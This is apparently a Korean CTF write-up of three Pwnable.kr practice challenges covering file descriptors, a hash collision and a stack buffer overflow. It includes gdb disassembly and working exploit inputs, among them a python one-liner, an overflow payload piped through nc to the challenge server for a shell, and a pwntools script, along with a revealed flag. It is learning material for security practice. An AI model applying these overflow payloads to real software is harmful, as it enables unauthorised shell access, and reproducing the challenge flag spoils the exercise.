
#Pwnable.kr 문제 풀이
-------
1. https://icmp-ycdi.tistory.com/48
    ```cpp
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    char buf[32];
    int main(int argc, char* argv[], char* envp[]){
            if(argc<2){
                    printf("pass argv[1] a number\n");
                    return 0;
            }
            int fd = atoi( argv[1] ) - 0x1234;
            int len = 0;
            len = read(fd, buf, 32);
            if(!strcmp("LETMEWIN\n", buf)){
                    printf("good job :)\n");
                    system("/bin/cat flag");
                    exit(0);
            }
            printf("learn about Linux file IO\n");
            return 0;

    }
    ```
   - 리눅스 File descriptor 응용
   - ssize_t read (int fd, void *buf, size_t nbytes)
   - fd의 경우 0: 표준입력, 1: 표준출력, 2: 표준에러
   - 표준입력을 받을 수 있도록 해야 flag가 표시됨
   - 고로 인자로 0x1234 -> 4660 입력 후 LETMEWIN 입력
   - cat flag를 하면 permission denied가 발생하지만, system 함수는 터미널 제어권을 루트 권한으로 가져갈 수 있는 함수이므로 매우 강력하게 사용될 수 있음. (Command Injection)
   - https://velog.io/@aqaqsubin/Linux-system-%EB%AC%B8%EC%A0%9C%EC%A0%90


2. https://icmp-ycdi.tistory.com/49
    ```Cpp
    #include
    #include
    unsigned long hashcode = 0x21DD09EC;
    unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
            res += ip[i];
        }
        return res;
    }

    int main(int argc, char* argv[]){
        if(argc<2){
            printf("usage : %s [passcode]\n", argv[0]);
            return 0;
        }
        if(strlen(argv[1]) != 20){
            printf("passcode length should be 20 bytes\n");
            return 0;
        }

        if(hashcode == check_password( argv[1] )){
            system("/bin/cat flag");
            return 0;
        }
        else
            printf("wrong passcode.\n");
        return 0;
    }
    ```

   - 입력한 데이터가 최종적으로 0x21DD09EC가 되도록
   - res = ip[0] + ip[1] + ip[2] + ip[3] + ip[4]
   - 20바이트의 문자열을 4바이트씩 나누어서 5번 res에 저장
   - ip[0] + ip[1] + ip[2] + ip[3] + ip[4] 의 결과가 0x21DD09EC가 되어야 함.
   - 가장 쉬운방법은 0x21DD09EC을 5로 나눈 결과값은 0x6C5CEC8을 네번, 이후 0x6C5CECC 입력해야 함
   - 0x21DD09EC를 입력하고 0x00000000을 입력하려고 할수도 있지만 ascii 코드 상 09가 Tab이므로 console 상 입력하려면 문제가 생길 수 있음.
   - 고로 가장 쉬운 방법을 따르자면 아래와 같음 (ascii 코드 상 문제만 없으면 숫자는 바뀔 수 있음.)
   - ./col `python -c 'print "\xC8\xCE\xC5\x06"*4+"\xcc\xce\xc5\x06"'`
   - 단 x86 시스템은 Little endian 을 사용하기 때문에 위와 같이 입력해줘야 함.
   - 참고로 python에서 print "\x41" 을 출력하면 ASCII값을 기준으로 A를 출력하므로 참고할 것


3. https://icmp-ycdi.tistory.com/50
   - 버퍼 오버플로우를 이용한 문제.
   - nc를 이용해 문제를 품, ssh가 아닌 cat으로 값을 넘겨줌
   - Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?

   - Download : http://pwnable.kr/bin/bof
   - Download : http://pwnable.kr/bin/bof.c
   - Running at : nc pwnable.kr 9000

   - wget http://pwnable.kr/bin/bof
   - wget http://pwnable.kr/bin/bof.c
   - 상기 두 파일을 다운로드, 파일 내용은 아래와 같음.
   ```Cpp
   #include <stdio.h>
   #include <string.h>
   #include <stdlib.h>
   
   void func(int key){
       char overflowme[32];
       printf("overflow me : ");                                                        
       gets(overflowme);    // smash me!
       if(key == 0xcafebabe){
           system("/bin/sh");
       }
       else{
           printf("Nah..\n");
       }
   }
   
   int main(int argc, char* argv[]){
       func(0xdeadbeef);
       return 0;
   }
   ```
   - key 값을 0xcafebabe로 만들어야 함.
   - 즉 bof 실행 프로그램의 구조를 정확하게 파악해야함 (gdb 사용)
   - https://mintnlatte.tistory.com/581 (gdb 명령어 정리)
   - gdb의 disas 명령어를 통해 assmebly 
   - gdb bof 를 통해 gdb를 실행한 후 아래와 같은 명령어를 통해 각 함수의 메모리 덤프를 땀.
   - disas main
   ```
   Dump of assembler code for function main:
   0x0000068a <+0>:	push   %ebp
   0x0000068b <+1>:	mov    %esp,%ebp
   0x0000068d <+3>:	and    $0xfffffff0,%esp
   0x00000690 <+6>:	sub    $0x10,%esp
   0x00000693 <+9>:	movl   $0xdeadbeef,(%esp) <- 키 값
   0x0000069a <+16>:	call   0x62c <func> <---func 호출
   0x0000069f <+21>:	mov    $0x0,%eax
   0x000006a4 <+26>:	leave  
   0x000006a5 <+27>:	ret    
   End of assembler dump.
   ```
   - disas func
   ```
   Dump of assembler code for function func:
   0x0000062c <+0>:	push   %ebp
   0x0000062d <+1>:	mov    %esp,%ebp
   0x0000062f <+3>:	sub    $0x48,%esp
   0x00000632 <+6>:	mov    %gs:0x14,%eax
   0x00000638 <+12>:	mov    %eax,-0xc(%ebp)
   0x0000063b <+15>:	xor    %eax,%eax
   0x0000063d <+17>:	movl   $0x78c,(%esp)
   0x00000644 <+24>:	call   0x645 <func+25> <-- printf
   0x00000649 <+29>:	lea    -0x2c(%ebp),%eax <--overflowme
   0x0000064c <+32>:	mov    %eax,(%esp)
   0x0000064f <+35>:	call   0x650 <func+36> <---gets
   0x00000654 <+40>:	cmpl   $0xcafebabe,0x8(%ebp) <-- compare (if문)
   0x0000065b <+47>:	jne    0x66b <func+63>
   0x0000065d <+49>:	movl   $0x79b,(%esp)
   0x00000664 <+56>:	call   0x665 <func+57>
   0x00000669 <+61>:	jmp    0x677 <func+75>
   0x0000066b <+63>:	movl   $0x7a3,(%esp)
   0x00000672 <+70>:	call   0x673 <func+71>
   0x00000677 <+75>:	mov    -0xc(%ebp),%eax
   0x0000067a <+78>:	xor    %gs:0x14,%eax
   0x00000681 <+85>:	je     0x688 <func+92>
   0x00000683 <+87>:	call   0x684 <func+88>
   0x00000688 <+92>:	leave  
   0x00000689 <+93>:	ret    
   End of assembler dump.
   ```
   - 여기서 문제의 힌트는 gets 함수를 이용해 공격하라고 함.
   - gets 함수는 읽어들일 문자열의 양이 지정되지 않았기 떄문에 overflow를 발생시키기 충분함. gets로 받는 주소는 overflowme[32]
   - overflowme와 key의 주소를 정확하게 파악하여 원하는 값을 넣는것이 관건
   - key의 주소는 쉽게 유추 가능함. if문 기준으로 0x8(%ebp)가 key의 위치, 이때 gdb에서의 해당 의미는 %ebp + 8위치
   - http://ehpub.co.kr/gets-%ED%95%A8%EC%88%98/
   - gets함수는 인자로 문자열을 저장할 버퍼 주소가 들어가는데, 이때 값을 받기 이전에 인자를 정리하기 위한 부분이 mov -0x2c(%ebp), eax 임.
   - 즉 overflowme의 시작 주소는 %ebp - 0x2c
   - 즉 0x2c + 8 = 0x34 byte만큼의 offset이 존재하므로 dword 기준 52개 이후 0xcafebabe를 입력해야 함.
   - 이때 bof 의 내용으로 보면, 실제 함수 실행시 인자로 (argv) 값을 넣어주는게 아닌 gets로 실행함.
   - 이때 문제에서 주어진 힌트인 pwnable.kr에 nc(netcat)으로 접근 
   - https://whackur.tistory.com/166
   - 이때 정방향 쉘 연결을 이용해 공격
   - (python -c 'print "A"*52 + "\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000
   - cat flag -> daddy, I just pwned a buFFer :)
   - 이때 이 nc 의 기능은 파이썬  pwntools 에서도 사용 가능
   - pip install pwntools
   ```Python
   #!/usr/bin/python
   from pwn import *

   payload = 'A' * 52 + '\xbe\xba\xfe\xca'
   shell = remote('pwnable.kr',9000)
   shell.send(payload)
   shell.interactive()
   ```
   - 상기와 같이 공격하는 방법도 존재함.
